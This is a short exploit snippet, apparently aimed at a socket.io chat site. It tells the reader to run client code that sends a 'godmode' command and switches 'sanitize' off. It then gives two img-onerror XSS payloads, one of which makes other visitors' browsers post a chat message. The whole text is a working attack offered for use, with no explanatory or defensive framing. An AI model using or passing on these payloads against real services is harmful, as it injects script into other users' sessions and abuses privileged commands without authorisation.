//RUN THIS CODE WITHOUT THE 2 SLASHES.
// socket.emit('command', {
   // list: ['godmode']
// });
// socket.emit('command', {
  // list: ['sanitize', 'off']
// });
<img src="x" onerror="alert('i love xss')">
  
<img src="x" onerror="socket.emit('talk',{text:'i love xss'});">
